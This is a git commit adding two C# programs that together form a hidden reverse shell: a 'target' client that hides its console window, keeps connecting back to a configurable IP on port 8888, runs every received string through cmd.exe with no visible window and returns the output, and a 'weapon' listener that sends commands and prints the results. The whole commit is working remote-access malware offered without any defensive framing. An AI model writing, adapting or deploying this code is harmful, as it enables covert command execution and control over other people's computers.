7b606f010cfb421e38e108dc9c845b36686c4a55
Zac McChesney <Zac McChesney>
2016-07-21 16:04:48 +0100

    Theoretically fully functional

---
+++ Target/Program.cs
@@ -0,0 +1,72 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Net.Sockets;
+using System.IO;
+using System.Runtime.InteropServices; //hide window
+
+namespace Weapon
+{
+    class Program
+    {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        static void Main(string[] args)
+        {
+            var handle = GetConsoleWindow();
+            // Hide
+            ShowWindow(handle, SW_HIDE);
+            // Show
+            //ShowWindow(handle, SW_SHOW);
+
+            string ip = "127.0.0.1"; //Change to IP that weapon is running on
+            TcpClient server;
+            while (true)
+            {
+                try
+                {
+                    server = new TcpClient(ip, 8888); //Port that weapon is listening on
+                    if (server.Connected)
+                    {
+                        StreamReader reader = new StreamReader(server.GetStream());
+                        StreamWriter writer = new StreamWriter(server.GetStream());
+                        writer.AutoFlush = true;
+                        string message = reader.ReadLine();
+                        if (message == "disarm")
+                        {
+                            Environment.Exit(0);
+                        }
+                        System.Diagnostics.Process process = new System.Diagnostics.Process();
+                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                        startInfo.FileName = "cmd.exe";
+                        startInfo.Arguments = "/C " + message;
+                        startInfo.UseShellExecute = false;
+                        startInfo.RedirectStandardOutput = true;
+                        process.StartInfo = startInfo;
+                        process.Start();
+                        string output = process.StandardOutput.ReadToEnd();
+                        process.WaitForExit();
+                        writer.WriteLine(output);
+                        reader.Close();
+                        writer.Close();
+                        server.Close();
+                    }
+                }
+                catch (Exception ex)
+                {
+
+                }
+            }
+        }
+    }
+}
---
+++ Weapon/Program.cs
@@ -0,0 +1,59 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Net.Sockets;
+using System.IO;
+
+namespace Target
+{
+    class Program1
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length == 0)
+            {
+                Console.WriteLine("No command specified\nSyntax example: weapon dir c:\\\nType: \"weapon disarm\" to close the target");
+                Environment.Exit(1);
+            }
+            DateTime local;
+            IPAddress ip = IPAddress.Parse("127.0.0.1");
+            TcpListener serverSocket = new TcpListener(ip, 8888); //Change port if necesary
+            TcpClient clientSocket = default(TcpClient);
+            serverSocket.Start();
+            local = DateTime.Now;
+            Console.WriteLine(local.ToShortTimeString() + ": Opened server");
+            clientSocket = serverSocket.AcceptTcpClient();
+            local = DateTime.Now;
+            Console.WriteLine(local.ToShortTimeString() + ": Connected to weapon");
+
+            while (clientSocket.Connected)
+            {
+                StreamReader reader = new StreamReader(clientSocket.GetStream());
+                StreamWriter writer = new StreamWriter(clientSocket.GetStream());
+                writer.AutoFlush = true;
+                string message = "";
+                if (args.Length == 0)
+                {
+                    break;
+                }
+                for (int i = 0; i < args.Length; i++)
+                {
+                    message += args[i];
+                    message += " ";
+                }
+                writer.WriteLine(message);
+                string output = reader.ReadToEnd();
+                Console.WriteLine(output);
+                reader.Close();
+                writer.Close();
+                break;
+            }
+            serverSocket.Stop();
+            local = DateTime.Now;
+            Console.WriteLine(local.ToShortTimeString() + ": Closed server");
+        }
+    }
+}
